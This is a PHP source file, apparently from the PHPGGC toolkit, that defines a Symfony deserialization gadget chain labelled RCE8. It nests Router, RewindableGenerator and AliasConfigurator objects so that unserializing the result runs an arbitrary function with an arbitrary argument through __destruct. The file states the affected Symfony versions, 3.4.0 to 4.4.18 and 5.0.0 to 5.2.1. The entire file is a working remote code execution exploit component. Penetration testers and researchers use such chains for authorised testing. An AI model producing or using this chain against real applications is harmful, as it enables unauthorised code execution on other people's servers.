<?php

namespace GadgetChain\Symfony;

class RCE8 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \Symfony\Component\Routing\Router(
            '\Symfony\Component\Finder\Iterator\CustomFilterIterator',
            new \ArrayIterator([$parameters["parameter"]]),
            [$parameters["function"]]
        );
        $b = new \Symfony\Component\DependencyInjection\Argument\RewindableGenerator(
            [$a, 'getMatcher']
        );
        $c = new \Symfony\Component\DependencyInjection\Loader\Configurator\AliasConfigurator($b);

        return $c;
    }
}
